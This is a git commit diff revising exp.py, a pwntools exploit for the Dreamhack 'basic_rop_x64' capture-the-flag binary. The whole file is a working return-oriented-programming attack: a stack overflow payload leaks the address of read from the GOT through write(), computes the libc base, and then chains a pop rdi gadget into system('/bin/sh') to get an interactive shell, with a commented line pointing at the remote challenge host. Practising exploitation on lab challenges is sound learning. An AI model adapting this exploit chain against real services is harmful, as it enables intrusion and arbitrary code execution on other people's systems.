2cb742e7eecb28e540cd2efb85641288516f6a41
KayTii <dkhoitran2106@gmail.com>
2025-03-28 16:21:45 +0700

    exp.py

--- Dreamhack/basic_rop_x64/exp.py
+++ Dreamhack/basic_rop_x64/exp.py
@@ -1,37 +1,36 @@
 from pwn import *
 
-p = process("./basic_rop_x64")
+p = process('./basic_rop_x64')
 #p = remote("host3.dreamhack.games", 20091)
-e = ELF("./basic_rop_x64")
-libc = ELF("./libc.so.6",checksec=False)
-r = ROP(e)
+e = ELF('./basic_rop_x64')
+libc = ELF('./libc.so.6')
+gdb.attach(p, api=True)
 
 read_got = e.got['read']
 read_plt = e.plt['read']
-write_got = e.got['write']
 write_plt = e.plt['write']
 main = e.symbols['main']
-read_offset = libc.symbols['read']
-system_offset = libc.symbols['system']
-pop_rdi_ret = 0x0000000000400883
-pop_rsi_r15 = 0x0000000000400881
-#pop_rdi_ret = r.find_gadget(['pop rdi', 'ret'])[0]
-#pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
-sh = list(libc.search(b"/bin/sh"))[0]
+rdi = 0x0000000000400883
+rsi_r15 = 0x0000000000400881
+sh = next(libc.search(b'/bin/sh'))
 
-payload = b'A'*72
-payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15) + p64(read_got) + p64(8) + p64(write_plt) + p64(main)
+payload = b'A'*(0x40+0x8)
+payload += p64(rdi) + p64(1) + p64(rsi_r15) + p64(read_got) + p64(0) + p64(write_plt) #write(1, read_got,)
+payload += p64(main)
 p.send(payload)
 p.recvuntil(b'A'*0x40)
-read_add = u64(p.recvn(8))
-libc_base = read_add - read_offset
-system = libc_base + system_offset
-bin_sh = sh + libc_base
+read = u64(p.recvn(8))
+libc_base = read - libc.symbols['read']
+system = libc_base + libc.symbols['system']
+binsh = libc_base + sh
 
-payload = b'A'*72
-payload += p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
+log.info('read ' + hex(read))
+log.info('libc_base ' + hex(libc_base))
+log.info('system ' + hex(system))
+
+payload = b'A'*(0x40+0x8)
+payload += p64(rdi) + p64(binsh) + p64(system) #system("/bin/sh")
 
 p.send(payload)
-p.recvuntil(b'A' * 0x40)
 
 p.interactive()
